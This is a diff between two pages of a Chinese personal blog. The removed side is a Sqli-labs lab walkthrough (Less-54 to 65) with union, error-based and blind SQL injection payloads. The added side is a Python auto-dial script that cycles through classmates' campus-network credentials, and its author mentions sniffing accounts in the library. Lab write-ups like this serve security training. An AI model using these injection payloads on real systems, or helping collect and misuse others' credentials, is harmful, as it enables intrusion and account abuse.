@@ -20,11 +20,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        Sqli-labs实验Task4（less54-65）｜R_song&#39;s blog
+        python3 windows校园网自动拨号｜R_song&#39;s blog
         
     </title>
 
-    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/9. Sqli-lab实验Task4（less54-65）/">
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/29.python3 windows校园网自动拨号/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -154,7 +154,7 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>Sqli-labs实验Task4（less54-65）</h1>
+                    <h1>python3 windows校园网自动拨号</h1>
                     
                     <span class="meta">
                          作者 折戟
@@ -164,7 +164,7 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        <a class="tag" href="/tags/#小脚本" title="小脚本">小脚本</a>
                         
                     </div>
                 </div>
@@ -173,7 +173,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            Sqli-labs实验Task4（less54-65）
+            python3 windows校园网自动拨号
         </span>
     </div>
 </header>
@@ -184,30 +184,12 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="Sqli-labs实验Task4（less54-65）"><a href="#Sqli-labs实验Task4（less54-65）" class="headerlink" title="Sqli-labs实验Task4（less54-65）"></a>Sqli-labs实验Task4（less54-65）</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>Page 4又是不一样的挑战：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1cffad6074984f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>可以看到这一串英文的提示是告诉我们需要在不到10次尝试中从数据库challenges中的随机表中获取秘钥，有趣的是，每次都会重置，challenge都会产生随机的表名、列名、表数据。一直保持新鲜。<br>分析分析可以知道，这个和ctf差不多，我们需要获取flag来提交才算成功。<br>首先第一次判断闭合情况，一次成功，单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=1’</span><br></pre></td></tr></table></figure></p>
-<p>知道数据库名是challenges，下面获取表名：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-a6241fcbf6640597.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>获取了表名，果然是随机产生的，现在获取字段：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,column_name from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-06ae708b48b40d3c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>可以看到第一个字段是id，还是直接获取所有列名把，有点蠢，以为一次就能出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>8al0pvg8mg<span class="string">' and table_schema='</span>challenges<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-db7cee15feb21ce2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>根据观察列名应该就是第三个secet_IKU1后面几位应该就是随机产生的，哈哈现在获取flag了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-54/?id=0<span class="string">' union select id,sessid,secret_IKU1 from challenges.8al0pvg8mg -- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-1421a3be8fe22b3a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>哈哈哈，后面直接提交就可以了啦！透个底，作者第一次成功的次数是8次，这个是第二次写博客的时候重新测试的。</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一个和上一个差不多，不过将次数增加到了14次，可见难度肯定又有上升了！先来看看闭合情况：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-55/?id=1) -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<p>没有报错，很难受，就一个括号的闭合，我竟然猜了6次！！！！！太浪费了，太浪费了。后面就差不多了。54的payload可以直接用，更改一下闭合就行了。最后9次才出来，有点丢人。</p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>同样是14次，按照之前的套路，这个时候应该是一个有报错的双重闭合。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-56/?id=1<span class="string">') -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>单引号加括号，没意思，大家可以自己玩玩。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>我猜应该也是不同的闭合，每次套餐四个不是吗？<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-57/?id=1<span class="string">" -- #</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一次就给力了，只有5次机会，这就基本要保证我们每一次都不能出现错误。<br>测试了一下还是单引号闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>试一下54的payload发现不行！这样不行，那就得换方法了，发现可以报错，试试我们之前的updatexml的报错看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-58/?id=1<span class="string">' and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">')),1))-- #</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6269327-2fbee840c7552ba2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>成功，但是次数不够了，尴尬，只能重开一局了。<br>后面的话就直接修改updatexml里面的第二个参数的查询语句就可以啦，我就不废话了。</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这个比上面那个还简单，没有闭合。根据报错可以看出：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-59/?id=1 and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'challenges'</span>)),1))-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和上面一样，闭合情况改为了双引号加括号：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-60/?id=1<span class="string">") -- #</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>哇，这一次，我没有试出来，看了源码才弄出来闭合。。。。头皮发麻，单引号加两重括号，这第一次见：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-61/?id=1<span class="string">')) -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>其他的就和之前的一样。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>我的天，这一次让我们130次的机会，我猜现在肯定就只能利用布尔的盲注，不然照实验这么抠的，怎么会给130次机会。。<br>可以看到，现在没有报错，只能自己猜闭合情况，然后union联合查询也没用，只能利用布尔盲注。<br>闭合是单引号加括号。<br>尝试获取信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ 127.0.0.1/sqli-labs-master/Less-62/?id=1<span class="string">') and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class="string">'),1,1))=79,0,sleep(10)) -- #</span></span><br></pre></td></tr></table></figure></p>
-<p>这个时候肯定就只能利用脚本了。大家可以用sqlmap试试，我这里就没弄了。</p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>这个和62一样，不过闭合变成了单引号。</p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>这个也一样，闭合变成了双重括号！！！</p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>双引号加括号！</p>
-<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>本来看sqli-lab的分布图应该是有到less-75的，但是一直也没有找到，就暂且不论了。还有这次的sqli-lab的实验过程中，基本都是手动做的，因此很多需要布尔，时间的盲注的less都没有好好弄，之后有时间会整理出一套用工具的教程来完善一下。<br>就像我的学长曾经指导我一样，他没有具体去教我如何学习渗透，学习注入的知识，他很鄙视渗透，甚至都不愿教我们，但他又承认，这是安全工作者必备的技能。<br>安全学习过程中，路漫漫其修远兮！</p>
+                <hr>
+<h1 id="python3-windows校园网自动拨号"><a href="#python3-windows校园网自动拨号" class="headerlink" title="python3 windows校园网自动拨号"></a>python3 windows校园网自动拨号</h1><hr>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在学校基本没什么时间呆在宿舍，都在实验室。宿舍的台式基本都是用来打游戏的，特地去办个校园网觉得太亏了，但是免费的10G流量也根本不够用，更新个游戏一下就没了。突然发现本科毕业生的校园网每个人都有10G的毕业生流量，于是想着把这些账号拿来用，薅学校的羊毛。就把班上同学的账号要过来（也可以配合嗅探器来用），使用python3来自动拨号上网。</p>
+<h2 id="小脚本"><a href="#小脚本" class="headerlink" title="小脚本"></a>小脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def connect(username,password):</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmd_str=<span class="string">"rasdial %s %s %s"</span> %(name,username,password)</span><br><span class="line">    res=os.system(cmd_str)</span><br><span class="line">    <span class="keyword">if</span> res==0:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">def disconnect():</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmdstr=<span class="string">"rasdial %s /disconnect"</span> %name</span><br><span class="line">    os.system(cmdstr)</span><br><span class="line">    time.sleep(5)</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    f=open(<span class="string">"info.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">    i=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        i=i+1</span><br><span class="line">        line=line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(line[0:11],line[12:20])</span><br><span class="line">        <span class="keyword">if</span>(connect(line[0:11],line[12:20]) == True):</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="comment"># disconnect()</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+<p>代码很简单就是一个，其实就是一个windows 内置的拨号连接命令rasdial的使用而已。在windows的cmd中可以查看具体参数以及功能。这个脚本从info.txt这个文件中读取校园网账号密码，然后拨号，遇到账号密码错误的情况，5s后就会自动重拨，直到拨上为止。这个info.txt其是配合嗅探器，在学校图书馆嗅探来获取确实很刺激，但是就太嫑脸了，同学的一些账号就够用了。（额，后面的处理格式的方式看起来有点傻:）<br>还有一些小bug，我们的校园网超过10G之后也是可以拨上的，但是会进行限速，很慢很慢，所以准备在脚本中加入测网速的模块，有现成的，还没加上，有空就加上。</p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>脚本写好了，接着利用windows的计划任务功能来设置脚本自启动。<br>新建一个计划任务，然后取名：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-03d1caaaf048575f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>接着选择触发器，就是脚本执行的触发条件，我们设置为用户登录时，只要有用户登录就进行自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-950abd4fe766acd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2"><br>最后执行选择启动程序，其中第一项程序或脚本就是我们执行脚本的编译器的路径，这里我用的是anaconda的python。第二项参数就是我们所执行的文件了，比如我们所执行的文件在C盘根目录，填的就是C:/test.py。最后一项比较关键，起始于，这个网上说法不同，根据试验，应该是脚本执行的位置，就是比如我们这里的自动拨号的脚本connect.py，如果没有填写起始于选项执行时就会出现找不到info.txt文件，所以我们要将起始于这个选项填到脚本所在路径。然后就可以啦，可以注销看看自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b734a256d428c671.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3"><br>还有补充会继续完善。</p>
 
                 <hr>
                 
@@ -215,12 +197,12 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/04/15/21. PCI-DSS(V3.2.1)学习笔记(八)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(八)">&larr; Previous Post</a>
+                        <a href="/2019/04/15/8. Sqli-lab实验Task3（less39-53）/" data-toggle="tooltip" data-placement="top" title="Sqli-lab实验Task3（less39-53）">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/04/15/19. PCI-DSS(V3.2.1)学习笔记(六)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(六)">Next Post &rarr;</a>
+                        <a href="/2019/04/15/28.一个过人的小马/" data-toggle="tooltip" data-placement="top" title="一个过人的小马">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -236,7 +218,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs实验Task4（less54-65）"><span class="toc-text">Sqli-labs实验Task4（less54-65）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-54"><span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-55"><span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-56"><span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-57"><span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-58"><span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-59"><span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-60"><span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-61"><span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-62"><span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-63"><span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-64"><span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-65"><span class="toc-text">Less-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束语"><span class="toc-text">结束语</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python3-windows校园网自动拨号"><span class="toc-text">python3 windows校园网自动拨号</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小脚本"><span class="toc-text">小脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计划任务"><span class="toc-text">计划任务</span></a></li></ol></li></ol>
                 </div>
             </div>
         </div>
@@ -258,7 +240,7 @@
                     </h5>
                     <div class="tags">
                         
-                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        <a class="tag" href="/tags/#小脚本" title="小脚本">小脚本</a>
                         
                     </div>
                 </section>
